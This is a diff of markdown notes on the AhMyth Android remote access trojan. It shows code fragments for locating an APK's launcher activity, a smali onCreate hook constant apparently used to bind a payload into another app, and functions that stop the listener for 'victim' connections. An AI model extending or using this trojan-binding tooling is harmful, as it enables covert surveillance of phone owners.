@@ -1,4 +1,4 @@
-Launcher Extraction for `<application"` attribute | AppCtrl.js = Line 5658 --> 5707 |
+Launcher Extraction for `<application"` attribute | AppCtrl.js |
 ```javascript
 function GetLauncherPath(manifest, smaliPath) {
 
@@ -58,12 +58,12 @@ function GetLauncherPath(manifest, smaliPath) {
 ```
   
 
-OrgAppKey2 | Constants.js = Line 32 |
+OrgAppKey2 | Constants.js |
 ```javascript
 exports.orgAppKey2 = ';->onCreate()V';
 ```
     
-Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
+Stop function for the AhMyth Listener | AppCtrl.js |
 ```javascript
     // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
@@ -94,7 +94,7 @@ Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
     }
 ```
   
-Stop function for the AhMyth Listener | Main.js = Line 131 --> 166 + Line 244 --> Line 253 |
+Stop function for the AhMyth Listener | Main.js |
 ```javascript 
 // fired when stopped listening for victim
 ipcMain.on("SocketIO:StopListen", function (event, port) {
@@ -145,13 +145,12 @@ process.on('uncaughtException', function (error) {
 });
 ```
 
-Stop function for the AhMyth Listener | index.html = Line 69 |
+Stop function for the AhMyth Listener | index.html |
 ```html
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
 
-code utilising `unix "find"` command to find the launcher activity in the correct path.
-For some reason with this, it fails to read the file, but from what I can see it's definitely locating it.
+Function to properly locate launcher activity | AppCtrl.js |
 ```javascript
                 // this returns full path of smali file starting from the users home directory
                 $appCtrl.Log("Locating Launcher Activity...")
